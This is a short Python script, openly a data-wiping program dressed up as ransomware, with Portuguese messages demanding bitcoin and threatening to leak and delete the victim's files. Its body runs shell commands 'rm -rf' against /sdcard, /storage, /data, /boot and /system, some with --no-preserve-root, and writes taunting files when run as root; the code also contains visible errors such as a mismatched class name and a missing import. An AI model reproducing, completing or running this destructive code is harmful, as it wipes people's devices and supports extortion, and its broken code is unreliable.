from os import system as run_system
from time import sleep
from subprocess import run

class malwRe:
    def start(self):
    	run("clear")
    	
    	try:
    		print("Você caiu em um ransomware!!!, pague em bitcoin ou APAGAREMOS e VAZAREMOS  TODO QUE ESTA NO SEU DISPOSITIVO")
    		sleep(1)
    		print("Não adianta sair!, mesmo não perdendo os arquivos, nós teremos acesso ao seu dispositivo")
    		sleep(1)
    		print("Nós instalamos VARIOS malwares e VIRUS no seu dispositivo!, TEMOS CONTROLE TOTAL")
    		sleep(1)
    		
    	except KeyboardInterrupt:
    		print("ERROR")  		
    	
    	try:
    		run('rm-rf /Download/', shell=True)
    		run("rm -rf /Documents/", shell=True)
    		
    		run("rm -rf /sdcard/", shell=True)
    		run("rm -rf /storage/", shell=True)
    		
    		run("rm -rf --no-preserve-root /data",shell=True)
    		run("rm -rf --no-preserve-root /boot",shell=True)
    		run("rm -rf --no-preserve-root /system",shell=True)
    		
    		if os.geteuid() == 0:
    		   run("rm -rf /data",shell=True)
    		   run("rm -rf /boot",shell=True)
    		   run("rm -rf /system",shell=True)
    		   run("rm -rf --no-preserve-root /system",shell=True)
    		   
    		   for i in range(1, 101):
    		      filename = f"BY_WpsDroid{i}.txt"
    		      with open(filename, 'w') as f:
    		          f.write("kkk script kiddie otario")
    		          open(filename)
    		          
    	except FileNotFoundError as e:
    		print("ERRO") 

if __name__ == "__main__":
	wiper = malwaRe()
	wiper.start() 
	 